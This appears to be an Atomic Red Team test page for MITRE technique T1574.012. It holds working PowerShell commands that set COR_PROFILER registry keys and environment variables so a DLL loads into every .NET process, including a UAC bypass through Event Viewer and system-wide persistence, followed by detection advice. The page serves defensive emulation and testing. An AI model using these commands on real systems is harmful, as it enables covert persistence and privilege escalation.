# T1574.012 - Hijack Execution Flow: COR_PROFILER
Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - User scope COR_PROFILER
Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).
The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.
Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.
If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,
the notepad process will not execute with high integrity.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value #{file_name} -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
START MMC.EXE EVENTVWR.MSC
```

Invoke-AtomicTest T1574.012 -TestNumbers 1

### Atomic Test #2 - System Scope COR_PROFILER
Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.
The unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity
level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will
still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Write-Host "Creating system environment variables" -ForegroundColor Cyan
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
```

Invoke-AtomicTest T1574.012 -TestNumbers 2

### Atomic Test #3 - Registry-free process scope COR_PROFILER
Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '#{clsid_guid}'
$env:COR_PROFILER_PATH = '#{file_name}'
POWERSHELL -c 'Start-Sleep 1'
```

Invoke-AtomicTest T1574.012 -TestNumbers 3

## Detection
For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.